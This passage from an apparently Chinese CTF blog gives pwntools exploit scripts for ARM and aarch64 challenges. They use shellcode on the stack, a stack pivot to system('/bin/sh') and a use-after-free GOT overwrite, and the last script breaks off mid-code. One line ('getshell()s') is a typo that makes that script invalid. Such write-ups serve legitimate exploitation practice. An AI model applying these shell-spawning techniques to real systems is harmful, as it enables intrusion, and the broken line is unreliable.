p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x1041c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x104f0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r3_pc=<span class="number">0x0001036c</span></span><br><span class="line">shellcode=asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;,&quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;-g&quot;,&quot;1234&quot;, &quot;pwn&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Give me data to dump:&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">sla(<span class="string">b&#x27;Dump again (y/n):&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xa4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(stack)</span><br><span class="line">sla(<span class="string">b&#x27;Give me data to dump:&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">b&#x27;Dump again (y/n):&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h4 id="Root-Me-stack-spraying"><a href="#Root-Me-stack-spraying" class="headerlink" title="Root Me : stack_spraying"></a>Root Me : stack_spraying</h4><p>这个题在最后执行system的时候老是报错，不知道是什么原因，懒得深究了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x10668&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x21000</span>+<span class="number">0x600</span></span><br><span class="line">s=<span class="number">0x10704</span></span><br><span class="line">system=<span class="number">0x105a0</span></span><br><span class="line">scanf=<span class="number">0x10658</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;,&quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;pwn&quot;])</span></span><br><span class="line">gadget=<span class="number">0x0001055c</span> <span class="comment">#pop &#123;r0, r1, r4, r8, fp, ip, sp, pc&#125;</span></span><br><span class="line">pc=<span class="number">0x000105b0</span> <span class="comment">#pop &#123;r4, fp, pc&#125;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p32(bss+<span class="number">0x300</span>+<span class="number">0x44</span>)+p32(<span class="number">0x10658</span>)</span><br><span class="line">ggg()</span><br><span class="line">sla(<span class="string">b&#x27;Give me data to dump:&#x27;</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;61&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p32(bss+<span class="number">0x300</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(bss+<span class="number">0x300</span>+<span class="number">0x18</span>)+p32(<span class="number">0x105a0</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h4 id="Root-Me-use-after-free"><a href="#Root-Me-use-after-free" class="headerlink" title="Root Me : use_after_free"></a>Root Me : use_after_free</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x106e8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">asi,team,desc</span>):</span><br><span class="line">    <span class="keyword">if</span> asi!=<span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;add &#x27;</span>+asi)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;add&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Team: &#x27;</span>,team)</span><br><span class="line">    sla(<span class="string">b&#x27;Desc: &#x27;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">asi,index</span>):</span><br><span class="line">    <span class="keyword">if</span> asi!=<span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;show &#x27;</span>+asi)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;show&#x27;</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">index,point</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;score&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Points: &#x27;</span>,<span class="built_in">str</span>(point).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dle</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;del&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">asi,index,team,desc,point</span>):</span><br><span class="line">    <span class="keyword">if</span> asi!=<span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;edit &#x27;</span>+asi)</span><br><span class="line">        sla(<span class="string">b&#x27;Team: &#x27;</span>,team)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&quot;: &quot;</span>,<span class="string">b&#x27;edit&#x27;</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">        sla(<span class="string">b&#x27;Team: Team: &#x27;</span>,team)</span><br><span class="line">    sla(<span class="string">b&#x27;Desc: &#x27;</span>,desc)</span><br><span class="line">    sla(<span class="string">b&#x27;Points: &#x27;</span>,<span class="built_in">str</span>(point).encode()+<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count=<span class="number">0x23074</span></span><br><span class="line">akas=<span class="number">0x23478</span>  </span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;,&quot;-L&quot;, &quot;./&quot;, &quot;-g&quot;,&quot;1234&quot;, &quot;pwn&quot;])</span></span><br><span class="line"></span><br><span class="line">sscanf=elf.got[<span class="string">&#x27;sscanf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;tao0&#x27;</span>,<span class="string">&quot;team0&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="string">b&#x27;tao1&#x27;</span>,<span class="string">&quot;team1&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;tao2&#x27;</span>,<span class="string">&quot;team2&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;tao3&#x27;</span>,<span class="string">&quot;team3&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;tao4&#x27;</span>,<span class="string">&quot;team4&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dle(<span class="number">0</span>)</span><br><span class="line">show(<span class="string">b&#x27;tao0&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Desc:  &#x27;</span>)</span><br><span class="line">libc_base=uu32()-<span class="number">0x13b7c4</span></span><br><span class="line">system,binhs=getshell()s</span><br><span class="line">dle(<span class="number">2</span>)</span><br><span class="line">dle(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">b&#x27;tao5&#x27;</span>,<span class="string">&quot;team5&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(sscanf))</span><br><span class="line">edit(<span class="string">b&#x27;tao2&#x27;</span>,<span class="number">0</span>,<span class="string">b&#x27;team2&#x27;</span>,p32(system),<span class="number">0x100</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h3 id="aarch64-1"><a href="#aarch64-1" class="headerlink" title="aarch64"></a>aarch64</h3><h4 id="上海骇极杯-2018-baby-arm"><a href="#上海骇极杯-2018-baby-arm" class="headerlink" title="上海骇极杯 2018 baby_arm"></a>上海骇极杯 2018 baby_arm</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;aarch64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">set architecture aarch64</span></span><br><span class="line"><span class="string">target remote localhost:1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span 